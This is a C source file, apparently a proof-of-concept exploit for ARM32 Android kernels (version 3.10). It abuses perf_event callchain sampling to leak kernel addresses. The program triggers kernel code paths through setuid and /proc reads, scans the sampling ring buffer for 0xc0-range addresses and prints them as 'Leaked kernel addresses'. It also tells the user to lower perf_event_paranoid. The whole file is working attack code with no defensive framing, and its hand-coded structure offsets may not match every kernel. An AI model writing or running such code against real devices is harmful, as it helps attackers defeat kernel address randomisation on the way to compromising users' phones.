#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <signal.h>
#include <fcntl.h>

/* perf_event definitions for ARM/Android 6 kernel 3.10 */
struct perf_event_attr {
    unsigned int type;
    unsigned int size;
    unsigned long long config;
    union {
        unsigned long long sample_period;
        unsigned long long sample_freq;
    };
    unsigned long long sample_type;
    unsigned long long read_format;
    unsigned long long flags;  /* bitfield: disabled, inherit, pinned, etc */
    unsigned int wakeup_events;
    unsigned int wakeup_watermark;
    unsigned int bp_type;
    union {
        unsigned long long bp_addr;
        unsigned long long config1;
    };
    union {
        unsigned long long bp_len;
        unsigned long long config2;
    };
    unsigned long long branch_sample_type;
    unsigned long long sample_regs_user;
    unsigned long long sample_stack_user;
};

#define PERF_TYPE_SOFTWARE 1
#define PERF_COUNT_SW_CPU_CLOCK 0
#define PERF_COUNT_SW_TASK_CLOCK 1
#define PERF_SAMPLE_IP 1
#define PERF_SAMPLE_CALLCHAIN 32
#define PERF_FLAG_FD_CLOEXEC (1UL << 3)

/* Flags bitfield layout (bits in flags field) */
#define ATTR_DISABLED    (1ULL << 0)
#define ATTR_EXCLUDE_HV  (1ULL << 4)
#define ATTR_FREQ        (1ULL << 10)
#define ATTR_SAMPLE_ID_ALL (1ULL << 18)

struct perf_event_header {
    unsigned int type;
    unsigned short misc;
    unsigned short size;
};

#define PERF_RECORD_SAMPLE 9

static long perf_event_open(struct perf_event_attr *attr, pid_t pid,
                            int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

int main(void) {
    struct perf_event_attr pe;
    int fd;
    void *buf;
    int page_size = 4096;
    int mmap_size = (1 + 16) * page_size; /* 1 metadata + 16 data pages */

    printf("[*] Kernel address leak via perf_event callchains\n");
    printf("[*] perf_event_paranoid check...\n");
    
    int para_fd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY);
    if (para_fd >= 0) {
        char val[16] = {0};
        read(para_fd, val, sizeof(val)-1);
        close(para_fd);
        printf("[*] perf_event_paranoid = %s", val);
    }

    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_TASK_CLOCK;
    pe.sample_period = 0;
    pe.sample_freq = 4000;
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    pe.flags = ATTR_DISABLED | ATTR_EXCLUDE_HV | ATTR_FREQ;
    pe.wakeup_events = 1;

    fd = perf_event_open(&pe, 0 /* self */, -1 /* any cpu */, -1, 0);
    if (fd < 0) {
        perror("perf_event_open");
        printf("[!] Try: echo 1 > /proc/sys/kernel/perf_event_paranoid\n");
        return 1;
    }
    printf("[+] perf_event_open succeeded, fd=%d\n", fd);

    buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) {
        perror("mmap perf buffer");
        close(fd);
        return 1;
    }
    printf("[+] mmap succeeded\n");

    /* Enable event */
    ioctl(fd, 0x2400 /* PERF_EVENT_IOC_ENABLE */, 0);

    /* Generate samples by doing work that involves kernel paths */
    printf("[*] Generating samples (calling setuid, open, read)...\n");
    
    for (int round = 0; round < 50; round++) {
        /* setuid(getuid()) goes through sys_setuid -> prepare_creds -> commit_creds */
        setuid(getuid());
        
        /* Also read from /proc which goes through seq_operations */
        for (int i = 0; i < 100; i++) {
            int pfd = open("/proc/self/stat", O_RDONLY);
            if (pfd >= 0) {
                char tmp[512];
                read(pfd, tmp, sizeof(tmp));
                close(pfd);
            }
        }
        usleep(1000);
    }

    /* Disable event */
    ioctl(fd, 0x2401 /* PERF_EVENT_IOC_DISABLE */, 0);

    /* Parse the ring buffer - use correct offsets for perf_event_mmap_page */
    /* On kernel 3.10 ARM32: data_head is at offset 0x68 (104), data_tail at 0x70 (112) */
    unsigned long long head = *(volatile unsigned long long *)((char *)buf + 104);
    __sync_synchronize(); /* rmb */
    unsigned long long tail = *(volatile unsigned long long *)((char *)buf + 112);
    unsigned char *data = (unsigned char *)buf + page_size;
    unsigned int data_size = 16 * page_size;

    printf("[*] data_head=%llu data_tail=%llu\n", head, tail);
    
    int samples = 0;
    int kernel_addrs = 0;
    unsigned long long unique_addrs[4096];
    int n_unique = 0;

    while (tail < head && samples < 500) {
        struct perf_event_header *hdr = (void *)(data + (tail % data_size));
        
        if (hdr->type == PERF_RECORD_SAMPLE && hdr->size > sizeof(*hdr)) {
            samples++;
            /* After header: u64 ip, u64 nr, u64 ips[nr] */
            unsigned long long *payload = (unsigned long long *)((char *)hdr + sizeof(*hdr));
            unsigned long long ip = payload[0];
            unsigned long long nr = payload[1];
            
            /* Check IP and callchain entries for kernel addresses (0xc0XXXXXX) */
            if ((ip >> 28) == 0xc) {
                int is_new = 1;
                for (int j = 0; j < n_unique; j++) {
                    if (unique_addrs[j] == ip) { is_new = 0; break; }
                }
                if (is_new && n_unique < 4096) {
                    unique_addrs[n_unique++] = ip;
                    kernel_addrs++;
                }
            }
            
            for (unsigned long long k = 0; k < nr && k < 64; k++) {
                unsigned long long addr = payload[2 + k];
                if ((addr >> 28) == 0xc) {
                    int is_new = 1;
                    for (int j = 0; j < n_unique; j++) {
                        if (unique_addrs[j] == addr) { is_new = 0; break; }
                    }
                    if (is_new && n_unique < 4096) {
                        unique_addrs[n_unique++] = addr;
                        kernel_addrs++;
                    }
                }
            }
        }
        
        tail += hdr->size;
        if (hdr->size == 0) break;
    }

    printf("[+] Parsed %d samples, found %d unique kernel addresses\n", samples, n_unique);
    
    /* Print all unique kernel addresses sorted */
    /* Simple bubble sort */
    for (int i = 0; i < n_unique - 1; i++) {
        for (int j = 0; j < n_unique - i - 1; j++) {
            if (unique_addrs[j] > unique_addrs[j+1]) {
                unsigned long long tmp = unique_addrs[j];
                unique_addrs[j] = unique_addrs[j+1];
                unique_addrs[j+1] = tmp;
            }
        }
    }
    
    printf("\n[+] Leaked kernel addresses:\n");
    for (int i = 0; i < n_unique; i++) {
        printf("  0x%08llx\n", unique_addrs[i]);
    }

    munmap(buf, mmap_size);
    close(fd);
    return 0;
}
